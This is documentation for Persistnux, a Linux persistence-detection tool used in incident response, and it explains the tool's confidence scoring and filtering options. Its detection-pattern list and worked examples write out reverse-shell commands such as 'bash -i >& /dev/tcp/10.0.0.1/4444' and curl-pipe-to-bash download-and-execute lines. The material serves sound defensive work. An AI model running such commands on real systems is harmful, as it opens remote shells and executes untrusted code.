# Persistnux Filtering Guide

## Overview

Starting with v1.2.0, Persistnux implements intelligent filtering to reduce false positives and focus on actionable threats. By default, the tool now shows **only suspicious findings** (MEDIUM, HIGH, CRITICAL confidence) instead of all persistence mechanisms.

## Why Filtering Matters

On a typical Linux system, there can be:
- 200+ systemd services (most are legitimate vendor services)
- 50+ cron jobs (many are package-managed maintenance tasks)
- 100+ shell profile scripts (distribution defaults)
- Dozens of SSH keys and configs

**Without filtering**, you get overwhelmed with hundreds of LOW confidence findings that are perfectly legitimate.

**With filtering** (default), you immediately see the 5-10 items that actually need investigation.

## Filter Modes

### Suspicious Only (Default)

Shows only findings with suspicious indicators:
- **MEDIUM**: Potentially suspicious, requires review
- **HIGH**: Suspicious patterns detected (reverse shells, download/execute, etc.)
- **CRITICAL**: Highly suspicious, likely malicious

Hides:
- **LOW**: Baseline system configuration, package-managed files

```bash
# Default mode - shows only suspicious findings
sudo ./persistnux.sh
```

**Use Case**: Standard DFIR investigations, incident response, threat hunting

### All Findings

Shows every persistence mechanism detected, including baseline configurations:

```bash
# Show everything
sudo ./persistnux.sh --all
# OR
sudo FILTER_MODE=all ./persistnux.sh
```

**Use Case**: Baseline creation, comprehensive system inventory, compliance audits

## Confidence-Based Filtering

You can further filter by minimum confidence level:

### Show Only HIGH and CRITICAL

```bash
sudo ./persistnux.sh --min-confidence HIGH
# OR
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh
```

**Use Case**: High-fidelity alerting, automated detection pipelines, severity 1 incidents

### Show MEDIUM and Above

```bash
sudo ./persistnux.sh --min-confidence MEDIUM
```

This is effectively the same as the default "suspicious_only" mode.

## How Confidence Scoring Works

### Initial Assessment

Each persistence mechanism starts with a base confidence:
- New/unknown systemd service → MEDIUM
- Cron job in standard location → MEDIUM
- Shell profile with no suspicious content → LOW

### Pattern Detection Increases Confidence

If suspicious patterns are detected, confidence is upgraded to HIGH:
- Reverse shells: `bash -i >& /dev/tcp/`, `nc -e /bin/sh`
- Download and execute: `curl URL | bash`, `wget URL && chmod +x`
- Obfuscation: `base64 -d | bash`, `eval $(echo ...)`
- Suspicious locations: `/tmp`, `/dev/shm`
- Recent modifications: Files < 7 days old

### Package Management Decreases Confidence

If a file is managed by package manager, confidence is downgraded:
- HIGH → MEDIUM (e.g., package-managed systemd service with suspicious-looking command)
- MEDIUM → LOW (e.g., package-managed cron job)

### Known-Good Services Are Skipped

Common vendor services are automatically filtered out:
- `systemd-*`, `dbus-*`, `snap.*`, `NetworkManager`, `ssh`, `cron`, etc.

These never appear in output, even with `--all` mode.

## Real-World Examples

### Example 1: Malicious Cron Job

```bash
# Unmanaged cron job with reverse shell
File: /etc/cron.d/backdoor
Confidence: HIGH
Reason: Unmanaged + reverse shell pattern + recent modification
Pattern: bash -i >& /dev/tcp/10.0.0.1/4444
```

**Verdict**: Will appear in default output → Investigate immediately

### Example 2: Legitimate System Cron

```bash
# Package-managed system maintenance cron
File: /etc/cron.daily/apt-compat
Confidence: LOW (downgraded from MEDIUM)
Package: dpkg:apt
```

**Verdict**: Hidden in default output → Benign, skip investigation

### Example 3: Suspicious Service

```bash
# Custom systemd service downloading scripts
File: /etc/systemd/system/update-checker.service
Confidence: HIGH
Reason: Unmanaged + download pattern
ExecStart: /bin/bash -c 'curl https://example.com/script.sh | bash'
Package: unmanaged
```

**Verdict**: Will appear in default output → High priority investigation

### Example 4: Package-Managed Service with Suspicious Command

```bash
# Legitimate package with unusual command
File: /lib/systemd/system/some-service.service
Confidence: MEDIUM (downgraded from HIGH)
Reason: Contains 'curl' but is package-managed
Package: dpkg:some-package
```

**Verdict**: Will appear in default output → Low priority, verify package authenticity

## Filtering Best Practices

### For Incident Response (Active Investigation)

```bash
# Show only HIGH confidence findings for quick triage
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh
```

Focus on the most suspicious items first, then expand if needed.

### For Threat Hunting

```bash
# Default suspicious-only mode
sudo ./persistnux.sh
```

Review MEDIUM and HIGH findings to identify anomalies and suspicious patterns.

### For Baseline Creation

```bash
# Show everything on a known-good system
sudo ./persistnux.sh --all
```

Create a comprehensive inventory of all persistence mechanisms for future comparison.

### For Automated Detection

```bash
# HIGH confidence only + custom output
sudo MIN_CONFIDENCE=HIGH OUTPUT_DIR=/var/log/detection ./persistnux.sh
```

Integrate into SIEM/SOAR with high-fidelity detections only.

## Output Impact

### Default Mode (suspicious_only)

Typical output on a standard Ubuntu server:
- **15-30 findings** (MEDIUM/HIGH confidence)
- Focus on unmanaged files and suspicious patterns
- Quick review time: 5-10 minutes

### All Mode

Typical output on the same Ubuntu server:
- **200-500 findings** (includes all LOW confidence)
- Includes every systemd service, cron job, profile script
- Review time: 30-60 minutes

## Command Reference

```bash
# Show help
./persistnux.sh --help

# Default: suspicious only
sudo ./persistnux.sh

# Show all findings
sudo ./persistnux.sh --all
sudo FILTER_MODE=all ./persistnux.sh

# HIGH confidence only
sudo ./persistnux.sh --min-confidence HIGH
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh

# MEDIUM and above
sudo ./persistnux.sh --min-confidence MEDIUM

# Custom output directory
sudo OUTPUT_DIR=/tmp/evidence ./persistnux.sh

# Combine options
sudo OUTPUT_DIR=/var/log/ir MIN_CONFIDENCE=HIGH ./persistnux.sh
```

## Filtering in Post-Processing

You can also filter the output files after collection:

### CSV Filtering

```bash
# Show only HIGH confidence from CSV
awk -F',' '$7 == "HIGH"' persistnux_*.csv

# Show only unmanaged files
awk -F',' '$10 ~ /package=unmanaged/' persistnux_*.csv
```

### JSONL Filtering

```bash
# Show only HIGH confidence from JSONL
jq 'select(.confidence == "HIGH")' persistnux_*.jsonl

# Show only unmanaged files
jq 'select(.additional_info | contains("package=unmanaged"))' persistnux_*.jsonl

# Count findings by confidence
jq -r '.confidence' persistnux_*.jsonl | sort | uniq -c
```

## Migration from v1.1

If you're upgrading from v1.1 and want the old behavior (show everything):

```bash
# v1.1 behavior: show all findings
sudo ./persistnux.sh --all
```

The v1.2 default behavior focuses on suspicious findings for better DFIR efficiency.

## Troubleshooting

### "I'm not seeing any findings"

Possible causes:
1. System is clean (good!)
2. Filter is too aggressive (try `--all` to see if there are LOW confidence items)
3. Known-good whitelist filtered out the findings (check if it's a standard vendor service)

### "I'm seeing too many findings"

Solutions:
1. Use `MIN_CONFIDENCE=HIGH` to see only high-confidence detections
2. Review package status - package-managed items are usually safe
3. Create a baseline on a known-good system and compare

### "Package-managed file showing as HIGH confidence"

This can happen if:
1. The package contains legitimately suspicious patterns (e.g., monitoring tools)
2. The package has been compromised (rare but possible)
3. The pattern detection is too aggressive (please report as issue)

**Recommended Action**: Verify the package authenticity:
```bash
# Debian/Ubuntu
dpkg -V package-name

# RedHat/CentOS
rpm -V package-name
```

## Further Reading

- [README.md](README.md) - Installation and usage
- [DFIR_GUIDE.md](DFIR_GUIDE.md) - Incident response workflows
- [FALSE_POSITIVE_REDUCTION_STRATEGY.md](FALSE_POSITIVE_REDUCTION_STRATEGY.md) - Technical details
- [SUSPICIOUS_INDICATORS.md](SUSPICIOUS_INDICATORS.md) - Pattern definitions
- [CHANGELOG.md](CHANGELOG.md) - Version history
